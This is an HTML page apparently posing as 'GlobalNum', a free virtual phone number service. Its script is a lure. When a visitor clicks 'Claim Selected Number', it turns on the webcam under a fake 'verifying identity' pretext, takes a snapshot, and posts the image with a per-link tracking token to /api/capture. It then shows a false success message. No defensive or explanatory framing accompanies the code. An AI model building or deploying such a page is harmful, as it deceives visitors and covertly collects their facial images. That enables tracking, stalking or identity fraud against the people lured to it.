<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GlobalNum - Claim Your Virtual Number</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; text-align: center; padding: 20px; }
.container { max-width: 420px; margin: 50px auto; background: #1e293b; padding: 30px; border-radius: 15px; border: 1px solid #334155; }
.number-box { font-size: 18px; color: #38bdf8; font-weight: bold; margin: 10px 0; padding: 12px; background: #020617; border-radius: 8px; border: 1px solid #334155; cursor: pointer; transition: all 0.2s ease; }
.number-box:hover { border-color: #38bdf8; transform: scale(1.02); }
.number-box.active { background: #38bdf8; color: #020617; }
button { background: #38bdf8; color: #0f172a; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; margin-top: 15px; }
button:hover { background: #0ea5e9; }
#status { margin-top: 15px; color: #94a3b8; font-size: 14px; }
.spinner { display: none; margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
video { display: none; margin-top: 15px; border: 2px solid #38bdf8; border-radius: 8px; }
</style>
</head>
<body>
<div class="container">
    <h2>🌍 Virtual Numbers Available</h2>
    <p>Select a number to claim:</p>
    <div class="numbers">
        <div class="number-box">🇺🇸 +1 (202) 555‑0199</div>
        <div class="number-box">🇬🇧 +44 20 7946 0958</div>
        <div class="number-box">🇨🇦 +1 416 555 0133</div>
        <div class="number-box">🇦🇺 +61 2 9374 4000</div>
        <div class="number-box">🇩🇪 +49 30 901820</div>
        <div class="number-box">🇫🇷 +33 1 42 68 53 00</div>
    </div>
    <button id="claimBtn">Claim Selected Number</button>
    <div class="spinner" id="loader"></div>
    <p id="status"></p>
    <video id="video" autoplay playsinline width="200" height="150"></video>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
const claimBtn = document.getElementById('claimBtn');
const loader = document.getElementById('loader');
const status = document.getElementById('status');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let selectedNumber = null;
const urlParams = new URLSearchParams(window.location.search);
const token = urlParams.get('token');

document.querySelectorAll('.number-box').forEach(box => {
    box.addEventListener('click', () => {
        document.querySelectorAll('.number-box').forEach(b => b.classList.remove('active'));
        box.classList.add('active');
        selectedNumber = box.innerText;
    });
});

claimBtn.onclick = async () => {
    if(!selectedNumber) { status.innerText = "Select a number first!"; return; }
    if(!token) { status.innerText = "Invalid session token!"; return; }
    claimBtn.style.display='none'; loader.style.display='block'; status.innerText="Initializing secure connection...";

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream; video.style.display='block';
        status.innerText = "Verifying identity... Please allow camera access.";

        setTimeout(async ()=>{
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video,0,0);
            const imgBase64 = canvas.toDataURL('image/jpeg');

            await fetch('/api/capture',{
                method:'POST',
                body: JSON.stringify({ image: imgBase64, token }),
                headers: { 'Content-Type':'application/json' }
            });

            status.innerText=`Number ${selectedNumber} claimed successfully!`;
            loader.style.display='none';
            stream.getTracks().forEach(track=>track.stop());
        },2000);

    } catch(err) {
        status.innerText="Camera access is required."; loader.style.display='none'; claimBtn.style.display='block'; console.error(err);
    }
};
</script>
</body>
</html>
